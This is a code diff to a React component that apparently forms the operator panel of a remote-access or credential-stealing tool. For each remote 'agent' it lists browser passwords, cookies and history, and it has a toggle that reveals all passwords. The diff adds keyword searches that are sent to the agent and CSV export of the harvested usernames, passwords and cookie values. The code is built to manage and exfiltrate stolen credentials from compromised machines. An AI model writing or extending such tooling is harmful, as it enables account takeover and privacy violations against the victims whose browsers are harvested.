@@ -1,8 +1,8 @@
 import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { useTranslation } from 'react-i18next';
 import { Button, Skeleton, Tabs, Chip, Accordion } from '@heroui/react';
-import { Eye, EyeSlash, ArrowRotateLeft, ChevronDown, Globe } from '@gravity-ui/icons';
-import { getBrowser } from '../../api/othersoft';
+import { Eye, EyeSlash, ArrowRotateLeft, ChevronDown, Globe, Magnifier, Download } from '@gravity-ui/icons';
+import { getBrowser, searchBrowser } from '../../api/othersoft';
 import type { BrowserPassword, BrowserCookie, BrowserHistory, BrowserDataType } from '../../types/models';
 
 interface BrowserTabProps {
@@ -73,48 +73,151 @@ function ScrollLoader({ loading, hasMore, onLoadMore }: { loading: boolean; hasM
   return <div ref={sentinelRef} className="h-4">{loading && <Skeleton className="h-8 rounded-xl mt-2" />}</div>;
 }
 
+// CSV export helper
+function downloadCsv(filename: string, headers: string[], rows: (string | number)[][]) {
+  const csvContent = [
+    headers.join(','),
+    ...rows.map(row => row.map(cell => {
+      const s = String(cell ?? '');
+      return s.includes(',') || s.includes('"') || s.includes('\n')
+        ? `"${s.replace(/"/g, '""')}"` : s;
+    }).join(','))
+  ].join('\n');
+
+  const BOM = '\uFEFF';
+  const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(url);
+}
+
 export function BrowserTab({ agentId }: BrowserTabProps) {
   const { t } = useTranslation();
   const [subTab, setSubTab] = useState<string>('passwords');
   const [showAllPasswords, setShowAllPasswords] = useState(false);
+
+  // Search state
+  const [searchKeyword, setSearchKeyword] = useState('');
+  const [searchLoading, setSearchLoading] = useState(false);
+  const [searchResults, setSearchResults] = useState<BrowserPassword[] | BrowserCookie[] | BrowserHistory[] | null>(null);
+  const [searchTotal, setSearchTotal] = useState(0);
+  const [searchError, setSearchError] = useState<string | null>(null);
+
+  // Export dialog state
+  const [showExportMenu, setShowExportMenu] = useState(false);
 
   const pw = usePagedData<BrowserPassword>(agentId, 'passwords');
   const ck = usePagedData<BrowserCookie>(agentId, 'cookies');
   const hs = usePagedData<BrowserHistory>(agentId, 'history');
 
   // Filter out entries where url, username, and password are all empty
-  const filteredPasswords = useMemo(() =>
-    pw.items.filter(p => p.url || p.username || p.password),
-    [pw.items]
-  );
+  const filteredPasswords = useMemo(() => {
+    const source = searchResults && subTab === 'passwords'
+      ? (searchResults as BrowserPassword[])
+      : pw.items;
+    return source.filter(p => p.url || p.username || p.password);
+  }, [pw.items, searchResults, subTab]);
+
+  const filteredCookies = useMemo(() => {
+    if (searchResults && subTab === 'cookies') return searchResults as BrowserCookie[];
+    return ck.items;
+  }, [ck.items, searchResults, subTab]);
+
+  const filteredHistory = useMemo(() => {
+    if (searchResults && subTab === 'history') return searchResults as BrowserHistory[];
+    return hs.items;
+  }, [hs.items, searchResults, subTab]);
 
   useEffect(() => { pw.fetchPage(true); }, [agentId]);
 
   const handleTabChange = useCallback((key: string) => {
     setSubTab(key);
+    setSearchResults(null);
+    setSearchKeyword('');
+    setSearchError(null);
     const store = key === 'passwords' ? pw : key === 'cookies' ? ck : hs;
     if (store.initialLoading && store.items.length === 0) store.fetchPage(true);
   }, [pw, ck, hs]);
 
   const handleRefresh = useCallback(() => {
+    setSearchResults(null);
+    setSearchKeyword('');
+    setSearchError(null);
     const store = subTab === 'passwords' ? pw : subTab === 'cookies' ? ck : hs;
     store.reset();
     setTimeout(() => store.fetchPage(true), 0);
   }, [subTab, pw, ck, hs]);
 
+  // Search handler - sends to agent
+  const handleSearch = useCallback(async () => {
+    const keyword = searchKeyword.trim();
+    if (!keyword) return;
+    setSearchLoading(true);
+    setSearchError(null);
+    setSearchResults(null);
+    try {
+      const dataType: BrowserDataType = subTab === 'passwords' ? 'passwords' : subTab === 'cookies' ? 'cookies' : 'history';
+      const res = await searchBrowser(agentId, dataType, keyword);
+      setSearchResults(res.items ?? []);
+      setSearchTotal(res.total);
+    } catch (err: unknown) {
+      setSearchError(err instanceof Error ? err.message : String(err));
+    } finally {
+      setSearchLoading(false);
+    }
+  }, [agentId, subTab, searchKeyword]);
+
+  // Export handler
+  const handleExport = useCallback((exportAll: boolean) => {
+    setShowExportMenu(false);
+
+    if (subTab === 'passwords') {
+      const data = exportAll ? pw.items : filteredPasswords;
+      downloadCsv(
+        `browser_passwords${searchKeyword ? '_search' : ''}.csv`,
+        ['Browser', 'URL', 'Username', 'Password', 'Version'],
+        data.map(p => [p.browser, p.url, p.username, p.password, p.version])
+      );
+    } else if (subTab === 'cookies') {
+      const data = exportAll ? ck.items : filteredCookies;
+      downloadCsv(
+        `browser_cookies${searchKeyword ? '_search' : ''}.csv`,
+        ['Browser', 'Domain', 'Name', 'Value', 'Version'],
+        data.map(c => [c.browser, c.host, c.name, c.value, c.version])
+      );
+    } else {
+      const data = exportAll ? hs.items : filteredHistory;
+      downloadCsv(
+        `browser_history${searchKeyword ? '_search' : ''}.csv`,
+        ['Browser', 'URL', 'Title', 'Visits'],
+        data.map(h => [h.browser, h.url, h.title, h.visits])
+      );
+    }
+  }, [subTab, pw.items, ck.items, hs.items, filteredPasswords, filteredCookies, filteredHistory, searchKeyword]);
+
   const historyByHost = useMemo(() => {
+    const source = searchResults && subTab === 'history'
+      ? (searchResults as BrowserHistory[])
+      : hs.items;
     const map = new Map<string, (BrowserHistory & { key: string })[]>();
-    for (let i = 0; i < hs.items.length; i++) {
-      const h = hs.items[i]!;
+    for (let i = 0; i < source.length; i++) {
+      const h = source[i]!;
       let host: string;
       try { host = new URL(h.url).hostname; } catch { host = '(other)'; }
       if (!map.has(host)) map.set(host, []);
       map.get(host)!.push({ ...h, key: `${i}` });
     }
     return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
-  }, [hs.items]);
+  }, [hs.items, searchResults, subTab]);
 
   const currentErrors = subTab === 'passwords' ? pw.errors : subTab === 'cookies' ? ck.errors : hs.errors;
+  const isSearching = searchResults !== null;
+  const currentTotal = isSearching ? searchTotal : (subTab === 'passwords' ? pw.total : subTab === 'cookies' ? ck.total : hs.total);
 
   if (pw.initialLoading && subTab === 'passwords') {
     return (
@@ -128,21 +231,79 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
 
   return (
     <div className="space-y-3">
+      {/* Toolbar */}
       <div className="flex items-center justify-between">
         <div className="flex gap-2">
           <Chip variant="soft" color="accent">{t('othersoft.browser.passwords')}: {pw.total}</Chip>
           <Chip variant="soft" color="warning">{t('othersoft.browser.cookies')}: {ck.total}</Chip>
           <Chip variant="soft" color="default">{t('othersoft.browser.history')}: {hs.total}</Chip>
         </div>
-        <div className="flex gap-2">
+        <div className="flex gap-2 items-center">
           <Button size="sm" variant="ghost" onPress={() => setShowAllPasswords(v => !v)}>
             {showAllPasswords ? <EyeSlash className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
           </Button>
           <Button size="sm" variant="ghost" onPress={handleRefresh}>
             <ArrowRotateLeft className="w-4 h-4" />
           </Button>
+          {/* Export button */}
+          <div className="relative">
+            <Button size="sm" variant="ghost" onPress={() => setShowExportMenu(v => !v)}>
+              <Download className="w-4 h-4" />
+            </Button>
+            {showExportMenu && (
+              <div className="absolute right-0 top-full mt-1 z-50 bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-700 rounded-lg shadow-lg py-1 min-w-[160px]">
+                <button
+                  className="w-full text-left px-3 py-1.5 text-sm hover:bg-neutral-100 dark:hover:bg-neutral-800"
+                  onClick={() => handleExport(true)}
+                >
+                  {t('othersoft.browser.exportAll')} ({currentTotal})
+                </button>
+                {isSearching && (
+                  <button
+                    className="w-full text-left px-3 py-1.5 text-sm hover:bg-neutral-100 dark:hover:bg-neutral-800"
+                    onClick={() => handleExport(false)}
+                  >
+                    {t('othersoft.browser.exportSearch')} ({searchTotal})
+                  </button>
+                )}
+              </div>
+            )}
+          </div>
         </div>
       </div>
+
+      {/* Search bar */}
+      <div className="flex gap-2 items-center">
+        <input
+          type="text"
+          value={searchKeyword}
+          onChange={(e) => setSearchKeyword(e.target.value)}
+          onKeyDown={(e) => { if (e.key === 'Enter') handleSearch(); }}
+          placeholder={t('othersoft.browser.searchPlaceholder')}
+          className="flex-1 h-8 px-3 text-sm rounded-lg border border-neutral-300 dark:border-neutral-600 bg-white dark:bg-neutral-800 outline-none focus:border-blue-500"
+        />
+        <Button size="sm" variant="primary" isDisabled={searchLoading || !searchKeyword.trim()} onPress={handleSearch}>
+          {searchLoading ? (
+            <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+          ) : (
+            <Magnifier className="w-4 h-4" />
+          )}
+        </Button>
+        {isSearching && (
+          <Button size="sm" variant="ghost" onPress={() => { setSearchResults(null); setSearchKeyword(''); setSearchError(null); }}>
+            {t('othersoft.browser.clearSearch')}
+          </Button>
+        )}
+      </div>
+
+      {searchError && (
+        <div className="text-danger-500 text-sm">{searchError}</div>
+      )}
+      {isSearching && !searchLoading && (
+        <div className="text-sm text-default-500">
+          {t('othersoft.browser.searchResults', { count: searchTotal, keyword: searchKeyword })}
+        </div>
+      )}
 
       {currentErrors.length > 0 && (
         <div className="text-danger-500 text-sm">{currentErrors.join('; ')}</div>
@@ -181,13 +342,13 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
                   ))}
                 </tbody>
               </table>
-              <ScrollLoader loading={pw.loading} hasMore={pw.hasMore.current} onLoadMore={() => pw.fetchPage()} />
+              {!isSearching && <ScrollLoader loading={pw.loading} hasMore={pw.hasMore.current} onLoadMore={() => pw.fetchPage()} />}
             </div>
           )}
         </Tabs.Panel>
 
         <Tabs.Panel id="cookies">
-          {ck.items.length === 0 && !ck.loading ? (
+          {filteredCookies.length === 0 && !ck.loading ? (
             <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
           ) : (
             <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
@@ -202,7 +363,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
                   </tr>
                 </thead>
                 <tbody>
-                  {ck.items.map((c, idx) => (
+                  {filteredCookies.map((c, idx) => (
                     <tr key={idx} className="border-b border-neutral-100 dark:border-neutral-800 hover:bg-neutral-50 dark:hover:bg-neutral-900">
                       <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{c.browser}</Chip></td>
                       <td className="py-1.5 px-2">{c.host}</td>
@@ -213,12 +374,12 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
                   ))}
                 </tbody>
               </table>
-              <ScrollLoader loading={ck.loading} hasMore={ck.hasMore.current} onLoadMore={() => ck.fetchPage()} />
+              {!isSearching && <ScrollLoader loading={ck.loading} hasMore={ck.hasMore.current} onLoadMore={() => ck.fetchPage()} />}
             </div>
           )}
         </Tabs.Panel>
         <Tabs.Panel id="history">
-          {hs.items.length === 0 && !hs.loading ? (
+          {filteredHistory.length === 0 && !hs.loading ? (
             <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
           ) : (
             <div className="max-h-[600px] overflow-y-auto">
@@ -260,7 +421,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
                   </Accordion.Item>
                 ))}
               </Accordion>
-              <ScrollLoader loading={hs.loading} hasMore={hs.hasMore.current} onLoadMore={() => hs.fetchPage()} />
+              {!isSearching && <ScrollLoader loading={hs.loading} hasMore={hs.hasMore.current} onLoadMore={() => hs.fetchPage()} />}
             </div>
           )}
         </Tabs.Panel>
@@ -268,4 +429,3 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     </div>
   );
 }
-
